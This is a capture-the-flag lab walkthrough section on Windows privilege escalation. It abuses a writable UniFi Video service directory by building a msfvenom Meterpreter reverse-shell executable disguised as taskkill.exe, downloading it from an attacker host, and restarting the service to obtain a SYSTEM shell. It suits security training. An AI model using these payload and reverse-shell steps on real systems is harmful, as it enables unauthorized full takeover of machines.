# 15 - PrivEsc



# Unifi
```
*Evil-WinRM* PS C:\Users\Stacy\Documents> dir


    Directory: C:\Users\Stacy\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2018   9:36 AM              6 unifivideo
```

It contains a 6 character long string `stop`(with new line and carriage return). The filename is a hint that we should search for some type of vulnerability on unifi. 

# Searchsploit 
```bash
┌─[user@parrot]─[10.10.14.9]─[~/htb/giddy]
└──╼ $ searchsploit unifi video
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Ubiquiti Networks UniFi Video Default - 'crossdomain.xml' Security Bypass                                                                                   | php/webapps/39268.java
Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation                                                                                                     | windows/local/43390.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```


Local Privilege Escalation, that works for us. Here is the vulnerability, the service is running as system but users have write access to its installation directory because the unifi folder inherited its permissions from its parent directory "C:\ProgramData".


# Meterpreter Payload

```bash
┌─[user@parrot]─[10.10.14.14]─[~/htb/giddy/www]                                                
└──╼ $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f exe > taskkill.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload         
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload                                                   
Payload size: 510 bytes                                                                        
Final size of exe file: 7168 bytes
```


# Execute the payload
```powershell
*Evil-WinRM* PS C:\ProgramData\unifi-video> wget 10.10.14.14/taskkill.exe -o taskkill.exe
*Evil-WinRM* PS C:\ProgramData\unifi-video> sc.exe stop UniFiVideoService

SERVICE_NAME: UniFiVideoService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x2
        WAIT_HINT          : 0xbb8
```


# Reverse Meterpreter connected

```bash
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.14
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] Sending stage (200262 bytes) to 10.10.10.104
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.104:49709) at 2021-08-18 20:12:57 +0300

meterpreter > shell
Process 2700 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>whoami
whoami
nt authority\system
```